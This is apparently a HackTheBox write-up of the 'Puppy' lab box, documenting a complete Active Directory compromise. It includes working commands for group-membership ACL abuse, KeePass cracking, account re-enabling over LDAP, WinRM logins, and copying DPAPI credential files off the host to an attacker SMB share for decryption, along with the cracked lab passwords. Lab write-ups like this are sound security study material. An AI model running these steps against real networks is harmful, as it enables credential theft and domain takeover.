@@ -1,0 +1,164 @@
+Title: Puppy
+Tag: HTB
+Date: 2025-01-01
+
+# Overview
+
+Puppy was a Windows Active Directory box, starting from a set of given low-privilege domain credentials (`levi.james`). LDAP ACL enumeration showed that `levi.james`'s own group, `HR`, held write rights over the `DEVELOPERS` group's membership, allowing self-promotion into a group with access to a development SMB share. That share held a KeePass database, which cracked offline and unlocked a set of stored credentials for several other domain users. One of those credentials belonged to a disabled account, `adam.silver`, that was also a member of `Remote Management Users`; another domain user's credentials from the same vault were used to reset `adam.silver`'s password and re-enable the account through direct LDAP modification. A backup archive found in the newly gained WinRM session leaked another user's plaintext bind password, and DPAPI-protected credential and masterkey files pulled from that user's profile, once decrypted, revealed the plaintext password for a privileged `_adm` variant of the same account, completing the domain compromise.
+
+## Recon
+
+```
+> nmap -sC -sV -vv -oN nmap 10.10.11.70
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+111/tcp  open  rpcbind
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap    (Domain: PUPPY.HTB, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  ncacn_http
+636/tcp  open  tcpwrapped
+2049/tcp open  nlockmgr
+3260/tcp open  iscsi
+3268/tcp open  ldap (Global Catalog)
+3269/tcp open  tcpwrapped
+5985/tcp open  http (WinRM)
+```
+
+The scan confirmed a Windows domain controller (`DC`) for `PUPPY.HTB`, alongside an NFS/rpcbind service and an iSCSI listener, both somewhat unusual to see running directly on a domain controller.
+
+## Domain Enumeration
+
+`enum4linux -a` as `levi.james` confirmed SMB access to a `DEV` share, though directory listing on it was initially denied. It also mapped out group membership: `steph.cooper_adm` in `Administrators`; `adam.silver` and `steph.cooper` in `Remote Management Users`; `levi.james` in `HR`; and `ant.edwards`, `adam.silver`, and `jamie.williams` in `DEVELOPERS` (with `ant.edwards` also in `SENIOR DEVS`).
+
+## LDAP ACL Abuse - Self-Adding to DEVELOPERS
+
+Checking the DACL on the `DEVELOPERS` group with NetExec's LDAP module showed that the `HR` group itself, of which `levi.james` was a member, held write rights over it:
+
+```
+> nxc ldap 10.10.11.70 -u levi.james -p 'KingofAkron2025!' -d puppy.htb -M daclread -o TARGET=DEVELOPERS
+Access mask   : ReadControl, WriteProperties, ReadProperties, ListChildObjects
+Trustee (SID) : HR
+```
+
+With `WriteProperties` over the group, `levi.james` was added directly into `DEVELOPERS`:
+
+```
+> bloodyAD --host "10.10.11.70" -d "puppy.htb" -u "levi.james" -p 'KingofAkron2025!' add groupMember "developers" "levi.james"
+```
+
+## Credential Harvesting - KeePass Database on the DEV Share
+
+With `DEVELOPERS` membership, the `DEV` share was now listable and downloadable:
+
+```
+> smbclient '//10.10.11.70/DEV' -U 'levi.james%KingofAkron2025!'
+> get recovery.kdbx
+```
+
+The database used a newer KeePass file format not supported by the stock `keepass2john`, requiring John the Ripper to be built from source to get a compatible hash extractor. Once hashed and cracked against rockyou.txt, the database's master password was recovered:
+
+```
+> ./john/run/keepass2john ./recovery.kdbx > hash.txt
+> ./john/run/john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+liverpool (recovery)
+```
+
+Unlocking the vault with `keepassxc-cli` listed several stored entries, one per domain user, and each entry's password was pulled out individually:
+
+```
+ANTONY C. EDWARDS : Antman2025!
+JAMIE WILLIAMSON  : JamieLove2025!
+ADAM SILVER       : HJKL2025!
+```
+
+Since `adam.silver` was the only one of these also listed in `Remote Management Users`, he was the natural next target for WinRM access.
+
+## Enabling and Resetting adam.silver
+
+Authenticating over WinRM with the recovered `adam.silver` credentials failed. Checking the account showed it was disabled. Using `ant.edwards`'s own recovered vault credentials (which had rights to modify `adam.silver`), the password was reset to satisfy the domain's password policy, and the account was re-enabled directly via LDAP by clearing the `ACCOUNTDISABLE` flag in `userAccountControl`:
+
+```
+> bloodyAD --host 10.10.11.70 -d puppy.htb -u ant.edwards -p 'Antman2025!' set password adam.silver 'NewPass123!'
+> ldapmodify -x -H ldap://10.10.11.70 -D "ant.edwards@PUPPY.HTB" -w 'Antman2025!' -f enable_user.ldif
+```
+
+where `enable_user.ldif` set `userAccountControl` to `512` (a normal, enabled account).
+
+## Foothold - WinRM as adam.silver
+
+```
+> evil-winrm -i 10.10.11.70 -u adam.silver -p 'NewPass123!'
+```
+
+This succeeded, granting a shell and access to the user flag.
+
+## Credential Harvesting - Backup Archive
+
+A backup archive was found under `C:\Backups`. Downloading and extracting `site-backup-2024-12-30.zip` and grepping its contents for password-shaped strings turned up an LDAP bind credential embedded in a configuration file:
+
+```
+<bind-password>ChefSteph2025!</bind-password>
+```
+
+This corresponded to `steph.cooper`, one of the users seen earlier in `Remote Management Users`.
+
+## Lateral Movement - WinRM as steph.cooper
+
+```
+> evil-winrm -i 10.10.11.70 -u steph.cooper -p 'ChefSteph2025!'
+```
+
+This succeeded, but automated enumeration (WinPEAS) and initial Kerberos ticket checks (`kinit`/`klist`) didn't turn up anything further of direct use.
+
+## Privilege Escalation - DPAPI Credential Extraction
+
+A shortcut to Microsoft Edge on `steph.cooper`'s desktop suggested the browser might have saved credentials protected by Windows' DPAPI, backed by files under the user's profile:
+
+```
+C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\*
+C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\*
+```
+
+These directories are hidden and system-flagged by default, so their attributes were cleared before copying them out over an SMB share hosted on the attacking machine:
+
+```
+> attrib -h -s C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials
+> attrib -h -s C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1107
+> impacket-smbserver smb -smb2support ./
+> net use \\10.10.15.0\smb
+> xcopy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\*" "\\10.10.15.0\smb\temp" /E /H /K /Y
+> xcopy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-...-1107\*" "\\10.10.15.0\smb\temp" /E /H /K /Y
+```
+
+With the DPAPI masterkey file and encrypted credential blob copied off, Impacket's DPAPI tooling decrypted them in two steps: first recovering the masterkey using `steph.cooper`'s own logon password, then using that masterkey to decrypt the stored credential blob:
+
+```
+> impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
+Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
+
+> impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
+Username : steph.cooper_adm
+Unknown  : FivethChipOnItsWay2025!
+```
+
+The decrypted credential blob held saved login details for a privileged, administratively-named counterpart to `steph.cooper`'s own account.
+
+## Domain Admin - WinRM as steph.cooper_adm
+
+```
+> evil-winrm -i 10.10.11.70 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'
+```
+
+`steph.cooper_adm` was a member of `Administrators`, completing the domain compromise.
+
+## Takeaways
+
+- LDAP ACLs are worth checking on your own group memberships, not just on target accounts. A group you already belong to (like `HR` here) can itself hold write rights over a more privileged group, letting you add yourself in directly with no exploit required.
+- Development shares are a recurring source of leftover secrets. A KeePass database sitting on a share readable by an entire department is effectively a shared password vault for whoever can reach it.
+- Newer KeePass database format versions sometimes outpace what packaged cracking tools support; building the latest John the Ripper from source is a reliable fallback when a stock tool reports an unsupported file version.
+- A disabled account is not a dead end if you hold rights to re-enable it and reset its password; domain password policy still applies to the reset, but LDAP modification of `userAccountControl` can flip the account back on directly.
+- Backup archives are worth pulling and grepping broadly for anything password-shaped; configuration files bundled into a "harmless" site backup frequently retain live service credentials.
+- DPAPI-protected credentials and masterkeys sitting in a user's profile can be decrypted offline once you have that user's logon password, and are a common way for saved browser or application credentials to leak a more privileged account's plaintext password.
